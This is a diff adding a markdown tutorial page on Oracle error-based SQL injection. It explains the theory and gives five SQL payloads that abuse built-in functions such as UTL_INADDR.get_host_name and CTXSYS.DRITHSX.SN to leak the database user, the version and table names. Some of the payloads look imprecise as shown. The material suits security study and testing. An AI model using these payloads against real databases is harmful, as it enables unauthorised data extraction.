@@ -1,0 +1,89 @@
+---
+title: Mastering Oracle Error-Based SQL Injection
+description: Learn to exploit Oracle SQL's error-based injection for extracting sensitive
+  data.
+keywords:
+- Oracle
+- Error-Based SQL Injection
+- Database Error Messages
+- UTL_INADDR.get_host_name
+- CTXSYS.DRITHSX.SN
+---
+
+# Oracle Error Based
+
+## Context
+
+The objective of this article is to teach how to exploit Oracle SQL error-based injection to extract sensitive information from a database. This assumes familiarity with Oracle database architecture, SQL query execution, and error handling in SQL.
+
+## Theory
+
+### Error-Based SQL Injection in Oracle
+
+Error-based SQL injection is a technique that exploits the information revealed in database error messages to glean sensitive data. The vulnerability model relies on the fact that these error messages can inadvertently expose critical information about the database's structure. The attack sequence involves injecting specially crafted SQL payloads that cause the database to generate errors. These errors are then analyzed to infer database attributes such as table names and column types.
+
+### Common Oracle Error Functions and Techniques
+
+Certain Oracle functions can be leveraged in error-based SQL injection attacks. Functions like `UTL_INADDR.get_host_name` and `CTXSYS.DRITHSX.SN` can be exploited to trigger errors that, due to the way they handle errors, may reveal information about the database.
+
+For instance, using these functions in payloads often results in error messages that include data about the database's environment. This technique is especially powerful because it allows an attacker to use these built-in functions to create informative error messages without needing to exfiltrate data through normal channels.
+
+### Oracle Error Messages and Information Disclosure
+
+Oracle error messages, such as ORA- errors, can provide substantial information about the database schema, even if only limited data is directly visible. The vulnerability model here hinges on how extensive and descriptive these error messages can be, often including data that reveals structural insights.
+
+For effective exploitation, an attacker crafts SQL payloads intended to invoke specific errors. These errors might disclose details like the current user, table and column names, or even version information. Such exploitation of informative error messages can provide an attacker with a clear picture of the backend database.
+
+## Practice
+
+### Exploiting Oracle Error-Based SQL Injection
+
+To exploit Oracle error-based SQL injection, the following steps are undertaken. Each step involves the injection of SQL queries designed to provoke error messages which in turn reveal sensitive database information.
+
+- **Retrieve Current Database User:**
+
+    ```bash
+    SELECT UTL_INADDR.get_host_name((SELECT user FROM dual));
+    ```
+
+    This command triggers an error that can reveal the current database user through the error message.
+
+- **Determine Oracle Version Information:**
+
+    ```bash
+    SELECT CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1));
+    ```
+
+    This induces an error message that leaks information regarding the Oracle version in use.
+
+- **Disclose a Table Name:**
+
+    ```bash
+    SELECT ord_dicom.getmappingxpath((SELECT table_name FROM all_tables WHERE rownum=1));
+    ```
+
+    By executing this, an attacker can generate an error disclosing the name of an existing table.
+
+- **Infer Database Structure via XML Error:**
+
+    ```bash
+    SELECT dbms_xmlgen.getxml('SELECT * FROM dual WHERE 1=0');
+    ```
+
+    This payload uses XML error generation to reveal details about the database structure.
+
+- **Reveal Table Names Using XML Functions:**
+
+    ```bash
+    SELECT extract(xmlagg(xmlelement(e,table_name)), '/ROWSET/ROW/E') FROM all_tables WHERE rownum=1;
+    ```
+
+    The goal of this command is to utilize XML functions to craft an error message that includes table names.
+
+By following these steps, sensitive data can be extracted from Oracle databases by leveraging Oracle SQL's error-based injection points.
+
+## Tools
+
+- **SQLMap**
+- **Burp Suite**
+- **Oracle SQL Developer**
